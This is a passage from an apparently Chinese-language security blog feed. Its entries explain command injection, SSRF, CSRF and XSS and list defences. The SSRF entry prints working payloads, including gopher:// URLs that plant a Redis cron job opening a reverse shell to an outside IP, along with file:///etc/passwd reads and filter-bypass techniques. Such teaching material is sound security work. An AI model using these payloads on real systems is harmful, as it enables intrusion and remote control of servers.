&lt;p&gt;上面的方法为通过命令行重定向写入命令，接着通过 ls 按时间排序把命令写入文件，最后执行 直接在 Linux 终端下执行的话，创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如 w,[之类的短命令，(使用 ls /usr/bin/? 查看) 如果不添加命令，需要 Ctrl+D 才能结束，这样就等于标准输入流的重定向 而在 php 中，使用 shell_exec 等执行系统命令的函数的时候，是不存在标准输入流的，所以可以直接创建文件&lt;/p&gt;
&lt;h1 id=&#34;常用符号&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用符号&#34;&gt;#&lt;/a&gt; 常用符号&lt;/h1&gt;
&lt;h2 id=&#34;命令分隔符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令分隔符&#34;&gt;#&lt;/a&gt; 命令分隔符&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;%0a&lt;/code&gt;  /  &lt;code&gt;%0d&lt;/code&gt;  /  &lt;code&gt;\n&lt;/code&gt;  /  &lt;code&gt;\r&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;  /  &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;通配符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通配符&#34;&gt;#&lt;/a&gt; 通配符&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;*&lt;/code&gt;  0 到无穷个任意字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;?&lt;/code&gt;  一个任意字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt;  一个在括号内的字符，e.g.  &lt;code&gt;[abcd]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ - ]&lt;/code&gt;  在编码顺序内的所有字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[^ ]&lt;/code&gt;  一个不在括号内的字符&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;不使用时禁用相应函数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;尽量不要执行外部的应用程序或命令&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;做输入的格式检查&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;转义命令中的所有 shell 元字符&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;shell 元字符包括  &lt;code&gt;#&amp;amp;;`,|*?~&amp;lt;&amp;gt;^()[]&amp;#123;&amp;#125;$\&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SSRF/</guid>
            <title>SSRF</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SSRF/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>SSRF</category>
            <pubDate>Sat, 26 Nov 2022 16:59:44 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF 攻击通常针对外部网络无法直接访问的内部系统。&lt;/p&gt;
&lt;h2 id=&#34;漏洞危害&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞危害&#34;&gt;#&lt;/a&gt; 漏洞危害&lt;/h2&gt;
&lt;p&gt;SSRF 可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用 File 协议读取本地文件。&lt;/p&gt;
&lt;p&gt;内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在 SSRF 时，通常会造成较大的危害。&lt;/p&gt;
&lt;h1 id=&#34;利用方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用方式&#34;&gt;#&lt;/a&gt; 利用方式&lt;/h1&gt;
&lt;p&gt;SSRF 利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。&lt;/p&gt;
&lt;p&gt;以 curl 为例，可以使用 dict 协议操作 Redis、file 协议读文件、gopher 协议反弹 Shell 等功能，常见的 Payload 如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -vvv &#39;dict://127.0.0.1:6379/info&#39;

curl -vvv &#39;file:///etc/passwd&#39;

# * 注意: 链接使用单引号，避免$变量问题

curl -vvv &#39;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/103.21.140.84/6789 0&amp;gt;&amp;amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;相关危险函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关危险函数&#34;&gt;#&lt;/a&gt; 相关危险函数&lt;/h1&gt;
&lt;p&gt;SSRF 涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以 PHP 为例，涉及到的函数有  &lt;code&gt;file_get_contents()&lt;/code&gt;  /  &lt;code&gt;fsockopen()&lt;/code&gt;  /  &lt;code&gt;curl_exec()&lt;/code&gt;  等。&lt;/p&gt;
&lt;h1 id=&#34;过滤绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过滤绕过&#34;&gt;#&lt;/a&gt; 过滤绕过&lt;/h1&gt;
&lt;h2 id=&#34;更改ip地址写法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#更改ip地址写法&#34;&gt;#&lt;/a&gt; 更改 IP 地址写法&lt;/h2&gt;
&lt;p&gt;一些开发者会通过对传过来的 URL 参数进行正则匹配的方式来过滤掉内网 IP，如采用如下正则表达式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&amp;#123;3&amp;#125;$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&amp;#123;2&amp;#125;$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&amp;#123;2&amp;#125;$&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于这种过滤我们采用改编 IP 的写法的方式进行绕过，例如 192.168.0.1 这个 IP 地址可以被改写成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;8 进制格式：0300.0250.0.1&lt;/li&gt;
&lt;li&gt;16 进制格式：0xC0.0xA8.0.1&lt;/li&gt;
&lt;li&gt;10 进制整数格式：3232235521&lt;/li&gt;
&lt;li&gt;16 进制整数格式：0xC0A80001&lt;/li&gt;
&lt;li&gt;合并后两位：1.1.278 / 1.1.755&lt;/li&gt;
&lt;li&gt;合并后三位：1.278 / 1.755 / 3.14159267&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另外 IP 中的每一位，各个进制可以混用。&lt;/p&gt;
&lt;p&gt;访问改写后的 IP 地址时，Apache 会报 400 Bad Request，但 Nginx、MySQL 等其他服务仍能正常工作。&lt;/p&gt;
&lt;p&gt;另外，0.0.0.0 这个 IP 可以直接访问到本地，也通常被正则过滤遗漏。&lt;/p&gt;
&lt;h2 id=&#34;使用解析到内网的域名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用解析到内网的域名&#34;&gt;#&lt;/a&gt; 使用解析到内网的域名&lt;/h2&gt;
&lt;p&gt;如果服务端没有先解析 IP 再过滤内网地址，我们就可以使用 localhost 等解析到内网的域名。&lt;/p&gt;
&lt;p&gt;另外  &lt;code&gt;xip.io&lt;/code&gt;  提供了一个方便的服务，这个网站的子域名会解析到对应的 IP，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS0xOTItdWMwZXA5NmIuMTY4LjAuMS54aXAuaW8=&#34;&gt;例如 192.168.0.1.xip.io&lt;/span&gt;，解析到 192.168.0.1。&lt;/p&gt;
&lt;h2 id=&#34;利用解析url所出现的问题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用解析url所出现的问题&#34;&gt;#&lt;/a&gt; 利用解析 URL 所出现的问题&lt;/h2&gt;
&lt;p&gt;在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。&lt;/p&gt;
&lt;p&gt;比如  &lt;code&gt;http://www.baidu.com@192.168.0.1/&lt;/code&gt;  当后端程序通过不正确的正则表达式（比如将 http 之后到 com 为止的字符内容，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS13d3cta2Q5ZHc1NGRzOW4uYmFpZHUuY29t&#34;&gt;也就是 www.baidu.com&lt;/span&gt;，认为是访问请求的 host 地址时）对上述 URL 的内容进行解析的时候，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1VUkxob3N0d3d3LXh4MnBoYTcxMGExdHpvNjRiZ2R6YWM5OGN3bnlib2s0YnFwYTY5N28uYmFpZHUuY29t&#34;&gt;很有可能会认为访问 URL 的 host 为 www.baidu.com&lt;/span&gt;，而实际上这个 URL 所请求的内容都是 192.168.0.1 上的内容。&lt;/p&gt;
&lt;h2 id=&#34;利用跳转&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用跳转&#34;&gt;#&lt;/a&gt; 利用跳转&lt;/h2&gt;
&lt;p&gt;如果后端服务器在接收到参数后，正确的解析了 URL 的 host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。&lt;/p&gt;
&lt;p&gt;可以使用如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2h0dHBiaW4ub3JnL3JlZGlyZWN0LXRvP3VybD1odHRwOi8vMTkyLjE2OC4wLjE=&#34;&gt;http://httpbin.org/redirect-to?url=http://192.168.0.1&lt;/span&gt; 等服务跳转，但是由于 URL 中包含了 192.168.0.1 这种内网 IP 地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。&lt;/p&gt;
&lt;p&gt;常用的跳转有 302 跳转和 307 跳转，区别在于 307 跳转会转发 POST 请求中的数据等，但是 302 跳转不会。&lt;/p&gt;
&lt;h2 id=&#34;通过各种非http协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通过各种非http协议&#34;&gt;#&lt;/a&gt; 通过各种非 HTTP 协议&lt;/h2&gt;
&lt;p&gt;如果服务器端程序对访问 URL 所采用的协议进行验证的话，可以通过非 HTTP 协议来进行利用。&lt;/p&gt;
&lt;p&gt;比如通过 gopher，可以在一个 url 参数中构造 POST 或者 GET 请求，从而达到攻击内网应用的目的。例如可以使用 gopher 协议对与内网的 Redis 服务进行攻击，可以使用如下的 URL：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &amp;gt;&amp;amp; /dev/tcp/172.19.23.228/23330&amp;gt;&amp;amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;除了 gopher 协议，File 协议也是 SSRF 中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似  &lt;code&gt;file:///path/to/file&lt;/code&gt;  这种格式来访问计算机本地文件。使用 file 协议可以避免服务端程序对于所访问的 IP 进行的过滤。例如我们可以通过  &lt;code&gt;file:///d:/1.txt&lt;/code&gt;  来访问 D 盘中 1.txt 的内容。&lt;/p&gt;
&lt;h2 id=&#34;dns-rebinding&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns-rebinding&#34;&gt;#&lt;/a&gt; DNS Rebinding&lt;/h2&gt;
&lt;p&gt;一个常用的防护思路是：对于用户请求的 URL 参数，首先服务器端会对其进行 DNS 解析，然后对于 DNS 服务器返回的 IP 地址进行判断，如果在黑名单中，就禁止该次请求。&lt;/p&gt;
&lt;p&gt;但是在整个过程中，第一次去请求 DNS 服务进行域名解析到第二次服务端去请求 URL 之间存在一个时间差，利用这个时间差，可以进行 DNS 重绑定攻击。&lt;/p&gt;
&lt;p&gt;要完成 DNS 重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的 DNS Server，在我们的可控的 DNS Server 上编写解析服务，设置 TTL 时间为 0。这样就可以进行攻击了，完整的攻击流程为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器端获得 URL 参数，进行第一次 DNS 解析，获得了一个非内网的 IP&lt;/li&gt;
&lt;li&gt;对于获得的 IP 进行判断，发现为非黑名单 IP，则通过验证&lt;/li&gt;
&lt;li&gt;服务器端对于 URL 进行访问，由于 DNS 服务器设置的 TTL 为 0，所以再次进行 DNS 解析，这一次 DNS 服务器返回的是内网地址。&lt;/li&gt;
&lt;li&gt;由于已经绕过验证，所以服务器端返回访问内网资源的结果。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;利用ipv6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用ipv6&#34;&gt;#&lt;/a&gt; 利用 IPv6&lt;/h2&gt;
&lt;p&gt;有些服务没有考虑 IPv6 的情况，但是内网又支持 IPv6，则可以使用 IPv6 的本地 IP 如  &lt;code&gt;[::]&lt;/code&gt;   &lt;code&gt;0000::1&lt;/code&gt;  或 IPv6 的内网域名来绕过过滤。&lt;/p&gt;
&lt;h2 id=&#34;利用idn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用idn&#34;&gt;#&lt;/a&gt; 利用 IDN&lt;/h2&gt;
&lt;p&gt;一些网络访问工具如 Curl 等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。&lt;/p&gt;
&lt;p&gt;在这些字符中，部分字符会在访问时做一个等价转换，例如  &lt;code&gt;ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ&lt;/code&gt;  和  &lt;code&gt;example.com&lt;/code&gt;  等同。利用这种方式，可以用  &lt;code&gt;① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩&lt;/code&gt;  等字符绕过内网限制。&lt;/p&gt;
&lt;h1 id=&#34;可能的利用点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#可能的利用点&#34;&gt;#&lt;/a&gt; 可能的利用点&lt;/h1&gt;
&lt;h2 id=&#34;内网服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网服务&#34;&gt;#&lt;/a&gt; 内网服务&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Apache Hadoop 远程命令执行&lt;/li&gt;
&lt;li&gt;axis2-admin 部署 Server 命令执行&lt;/li&gt;
&lt;li&gt;Confluence SSRF&lt;/li&gt;
&lt;li&gt;counchdb WEB API 远程命令执行&lt;/li&gt;
&lt;li&gt;dict&lt;/li&gt;
&lt;li&gt;docker API 远程命令执行&lt;/li&gt;
&lt;li&gt;Elasticsearch 引擎 Groovy 脚本命令执行&lt;/li&gt;
&lt;li&gt;ftp /ftps（FTP 爆破）&lt;/li&gt;
&lt;li&gt;glassfish 任意文件读取和 war 文件部署间接命令执行&lt;/li&gt;
&lt;li&gt;gopher&lt;/li&gt;
&lt;li&gt;HFS 远程命令执行&lt;/li&gt;
&lt;li&gt;http、https&lt;/li&gt;
&lt;li&gt;imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）&lt;/li&gt;
&lt;li&gt;Java 调试接口命令执行&lt;/li&gt;
&lt;li&gt;JBOSS 远程 Invoker war 命令执行&lt;/li&gt;
&lt;li&gt;Jenkins Scripts 接口命令执行&lt;/li&gt;
&lt;li&gt;ldap&lt;/li&gt;
&lt;li&gt;mongodb&lt;/li&gt;
&lt;li&gt;php_fpm/fastcgi 命令执行&lt;/li&gt;
&lt;li&gt;rtsp - smb/smbs（连接 SMB）&lt;/li&gt;
&lt;li&gt;sftp&lt;/li&gt;
&lt;li&gt;ShellShock 命令执行&lt;/li&gt;
&lt;li&gt;Struts2 命令执行&lt;/li&gt;
&lt;li&gt;telnet&lt;/li&gt;
&lt;li&gt;tftp（UDP 协议扩展）&lt;/li&gt;
&lt;li&gt;tomcat 命令执行&lt;/li&gt;
&lt;li&gt;WebDav PUT 上传任意文件&lt;/li&gt;
&lt;li&gt;WebSphere Admin 可部署 war 间接命令执行&lt;/li&gt;
&lt;li&gt;zentoPMS 远程命令执行&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;redis利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#redis利用&#34;&gt;#&lt;/a&gt; Redis 利用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;写 ssh 公钥&lt;/li&gt;
&lt;li&gt;写 crontab&lt;/li&gt;
&lt;li&gt;写 WebShell&lt;/li&gt;
&lt;li&gt;Windows 写启动项&lt;/li&gt;
&lt;li&gt;主从复制加载 .so 文件&lt;/li&gt;
&lt;li&gt;主从复制写无损文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;云主机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#云主机&#34;&gt;#&lt;/a&gt; 云主机&lt;/h2&gt;
&lt;p&gt;在 AWS、Google 等云环境下，通过访问云环境的元数据 API 或管理 API，在部分情况下可以实现敏感信息等效果。&lt;/p&gt;
&lt;h1 id=&#34;防御方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御方式&#34;&gt;#&lt;/a&gt; 防御方式&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;过滤返回的信息&lt;/li&gt;
&lt;li&gt;统一错误信息&lt;/li&gt;
&lt;li&gt;限制请求的端口&lt;/li&gt;
&lt;li&gt;禁止不常用的协议&lt;/li&gt;
&lt;li&gt;对 DNS Rebinding，考虑使用 DNS 缓存或者 Host 白名单&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy45MXJpLm9yZy8xNzExMS5odG1s&#34;&gt;SSRF 漏洞分析与利用&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTcvdGh1cnNkYXkvdXMtMTctVHNhaS1BLU5ldy1FcmEtT2YtU1NSRi1FeHBsb2l0aW5nLVVSTC1QYXJzZXItSW4tVHJlbmRpbmctUHJvZ3JhbW1pbmctTGFuZ3VhZ2VzLnBkZg==&#34;&gt;A New Era Of SSRF&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpdW0uY29tL3NlY2p1aWNlL3BocC1zc3JmLXRlY2huaXF1ZXMtOWQ0MjJjYjI4ZDUx&#34;&gt;php ssrf technique&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUFlUSE9OL2RlZmVuZC1zc3JmLXZ1bG5lcmFibGUtaW4tcHl0aG9uLmh0bWw=&#34;&gt;谈一谈如何在 Python 开发中拒绝 SSRF 漏洞&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cuc2FmZWJ1ZmYuY29tLzIwMTYvMDcvMDMvU1NSRi1UaXBzLw==&#34;&gt;SSRF Tips&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qb3ljaG91Lm9yZy93ZWIvcGhwc3NyZi5odG1s&#34;&gt;SSRF in PHP&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/CSRF/</guid>
            <title>CSRF</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/CSRF/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>CSRF</category>
            <pubDate>Sat, 26 Nov 2022 16:58:44 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;跨站请求伪造 (Cross-Site Request Forgery, CSRF)，也被称为 One Click Attack 或者 Session Riding ，通常缩写为 CSRF，是一种对网站的恶意利用。尽管听起来像 XSS，但它与 XSS 非常不同，XSS 利用站点内的信任用户，而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。&lt;/p&gt;
&lt;h1 id=&#34;分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分类&#34;&gt;#&lt;/a&gt; 分类&lt;/h1&gt;
&lt;h2 id=&#34;资源包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#资源包含&#34;&gt;#&lt;/a&gt; 资源包含&lt;/h2&gt;
&lt;p&gt;资源包含是在大多数介绍 CSRF 概念的演示或基础课程中可能看到的类型。这种类型归结为控制 HTML 标签（例如 &amp;lt;image&amp;gt;、&amp;lt;audio&amp;gt;、&amp;lt;video&amp;gt;、&amp;lt;object&amp;gt;、&amp;lt;script &amp;gt; 等）所包含的资源的攻击者。如果攻击者能够影响 URL 被加载的话，包含远程资源的任何标签都可以完成攻击。&lt;/p&gt;
&lt;p&gt;由于缺少对 Cookie 的源点检查，如上所述，此攻击不需要 XSS，可以由任何攻击者控制的站点或站点本身执行。此类型仅限于 GET 请求，因为这些是浏览器对资源 URL 唯一的请求类型。这种类型的主要限制是它需要错误地使用安全的 HTTP 请求方式。&lt;/p&gt;
&lt;h2 id=&#34;基于表单&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于表单&#34;&gt;#&lt;/a&gt; 基于表单&lt;/h2&gt;
&lt;p&gt;通常在正确使用安全的请求方式时看到。攻击者创建一个想要受害者提交的表单；其包含一个 JavaScript 片段，强制受害者的浏览器提交。&lt;/p&gt;
&lt;p&gt;该表单可以完全由隐藏的元素组成，以致受害者很难发现它。&lt;/p&gt;
&lt;p&gt;如果处理 cookies 不当，攻击者可以在任何站点上发动攻击，只要受害者使用有效的 cookie 登录，攻击就会成功。如果请求是有目的性的，成功的攻击将使受害者回到他们平时正常的页面。该方法对于攻击者可以将受害者指向特定页面的网络钓鱼攻击特别有效。&lt;/p&gt;
&lt;h2 id=&#34;xmlhttprequest&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xmlhttprequest&#34;&gt;#&lt;/a&gt; XMLHttpRequest&lt;/h2&gt;
&lt;p&gt;XMLHttpRequest 可能是最少看到的方式，由于许多现代 Web 应用程序依赖 XHR，许多应用花费大量的时间来构建和实现这一特定的对策。&lt;/p&gt;
&lt;p&gt;基于 XHR 的 CSRF 通常由于 SOP 而以 XSS 有效载荷的形式出现。没有跨域资源共享策略 (Cross-Origin Resource Sharing, CORS)，XHR 仅限于攻击者托管自己的有效载荷的原始请求。&lt;/p&gt;
&lt;p&gt;这种类型的 CSRF 的攻击有效载荷基本上是一个标准的 XHR，攻击者已经找到了一些注入受害者浏览器 DOM 的方式。&lt;/p&gt;
&lt;h1 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;通过 CSRF-token 或者验证码来检测用户提交&lt;/li&gt;
&lt;li&gt;验证 Referer/Content-Type&lt;/li&gt;
&lt;li&gt;对于用户修改删除等操作最好都使用 POST 操作&lt;/li&gt;
&lt;li&gt;避免全站通用的 Cookie，严格设置 Cookie 的域&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZ2l0aHViLmNvbS9qcm96bmVyL2NzcmYtZGVtbw==&#34;&gt;demo&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpdW0uY29tL0Bqcm96bmVyL3dpcGluZy1vdXQtY3NyZi1kZWQ5N2FlN2U4M2Y=&#34;&gt;Wiping Out CSRF&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvMGFuZzNlbC9uZWF0LXRyaWNrcy10by1ieXBhc3MtY3NyZnByb3RlY3Rpb24=&#34;&gt;Neat tricks to bypass CSRF protection&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/</guid>
            <title>XSS</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/</link>
            <category>网络安全</category>
            <category>XSS</category>
            <category>漏洞</category>
            <pubDate>Sat, 26 Nov 2022 11:55:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分类&#34;&gt;#&lt;/a&gt; 分类&lt;/h1&gt;
&lt;h2 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;XSS 全称为 Cross Site Scripting，为了和 CSS 分开简写为 XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的 JavaScript 代码执行。XSS 通常被用于获取 Cookie、以受攻击者的身份进行操作等行为。&lt;/p&gt;
&lt;h2 id=&#34;反射型xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反射型xss&#34;&gt;#&lt;/a&gt; 反射型 XSS&lt;/h2&gt;
&lt;p&gt;反射型 XSS 是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句： &lt;code&gt;&amp;lt;?php echo &amp;quot;&amp;lt;p&amp;gt;hello, $_GET[&#39;user&#39;]&amp;lt;/p&amp;gt;&amp;quot;;?&amp;gt;&lt;/code&gt;  ，那么在访问时设置  &lt;code&gt;/?user=&amp;lt;/p&amp;gt;&amp;lt;script&amp;gt;alert(&amp;quot;hack&amp;quot;)&amp;lt;/script&amp;gt;&amp;lt;p&amp;gt;&lt;/code&gt;  ，则可执行预设好的 JavaScript 代码。&lt;/p&gt;
&lt;p&gt;反射型 XSS 通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到 XSS Auditor、NoScript 等防御手段的影响较大。&lt;/p&gt;
&lt;h2 id=&#34;储存型xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#储存型xss&#34;&gt;#&lt;/a&gt; 储存型 XSS&lt;/h2&gt;
&lt;p&gt;储存型 XSS 相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。&lt;/p&gt;
&lt;h2 id=&#34;dom-xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dom-xss&#34;&gt;#&lt;/a&gt; DOM XSS&lt;/h2&gt;
&lt;p&gt;DOM 型 XSS 不同之处在于 DOM 型 XSS 一般和服务器的解析响应没有直接关系，而是在 JavaScript 脚本动态执行的过程中产生的。&lt;/p&gt;
